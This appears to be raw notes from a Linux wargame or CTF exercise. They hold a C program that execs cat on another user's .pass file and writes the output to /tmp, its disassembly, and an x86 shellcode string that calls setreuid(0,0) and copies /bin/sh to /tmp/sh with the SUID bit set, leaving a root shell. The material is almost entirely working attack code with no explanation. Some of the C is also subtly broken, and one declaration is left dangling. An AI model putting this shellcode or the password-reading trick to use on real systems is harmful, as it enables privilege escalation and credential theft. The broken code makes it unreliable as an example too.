```c
#include <unistd.h>

void _()
{
        int     fd = fopen("/tmp/flag04", "w");
        char    cmd[3][25] = {"./././././././././bin/cat", "/home/users/level05/.pass", 0xFFFFFFFF};

        cmd[2] =  (int)cmd[2] ^ (int)cmd[2];
        dup2(fd, 1);
        execv(*cmd, cmd);
}

int main()
{
        _();
        return 0;
}
```

55                      push   %ebp
89 e5                   mov    %esp,%ebp
53                      push   %ebx
83 ec 24                sub    $0x24,%esp
e8 7e 00 00 00          call   80484de <__i686.get_pc_thunk.bx>
81 c3 94 1b 00 00       add    $0x1b94,%ebx
8d 83 cc e5 ff ff       lea    -0x1a34(%ebx),%eax
89 44 24 04             mov    %eax,0x4(%esp)
8d 83 ce e5 ff ff       lea    -0x1a32(%ebx),%eax
89 04 24                mov    %eax,(%esp)
e8 12 ff ff ff          call   8048390 <fopen@plt>
89 45 f4                mov    %eax,-0xc(%ebp)
8d 83 da e5 ff ff       lea    -0x1a26(%ebx),%eax
89 45 e8                mov    %eax,-0x18(%ebp)
8d 83 e3 e5 ff ff       lea    -0x1a1d(%ebx),%eax
89 45 ec                mov    %eax,-0x14(%ebp)
c7 45 f0 ff ff ff ff    movl   $0xffffffff,-0x10(%ebp)
c7 45 f0 00 00 00 00    movl   $0x0,-0x10(%ebp)
c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
00
8b 45 f4                mov    -0xc(%ebp),%eax
89 04 24                mov    %eax,(%esp)
e8 9c fe ff ff          call   8048350 <dup2@plt>
8b 45 e8                mov    -0x18(%ebp),%eax
8d 55 e8                lea    -0x18(%ebp),%edx
89 54 24 04             mov    %edx,0x4(%esp)
89 04 24                mov    %eax,(%esp)
e8 ba fe ff ff          call   8048380 <execv@plt>
83 c4 24                add    $0x24,%esp
5b                      pop    %ebx
5d                      pop    %ebp
c3                      ret

 char shellc[] =
/* Shellcode to drop a SUID root shell in /tmp/sh. 
   Forgive the Intel syntax in the commenting, bored with AT&T syntax..
 */

/* main: if (fork()) goto exeunt; else goto carryon; */
char t[] =
"\x29\xc0"    
"\xb0\x02"    
"\xcd\x80"
"\x85\xc0"    
"\x75\x02"    
"\xeb\x05"    
"\x29\xc0"    
"\x40"        
"\xcd\x80"
"\x29\xc0"    
"\x29\xdb"    
"\x29\xc9"    
"\xb0\x46"    
"\xcd\x80"
"\xeb\x2a"    
"\x5e"        
"\x89\x76\x32"
"\x8d\x5e\x08"
"\x89\x5e\x36"
"\x8d\x5e\x0b"
"\x89\x5e\x3a"
"\x29\xc0"    
"\x88\x46\x07"
"\x88\x46\x0a"
"\x88\x46\x31"
"\x89\x46\x3e"
"\x87\xf3"    
"\xb0\x0b"    
"\x8d\x4b\x32"
"\x8d\x53\x3e"
"\xcd\x80"
"\xe8\xd1\xff\xff\xff"
"\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f"
"\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x34"
"\x37\x35\x35\x20\x2f\x74\x6d\x70\x2f\x73\x68";
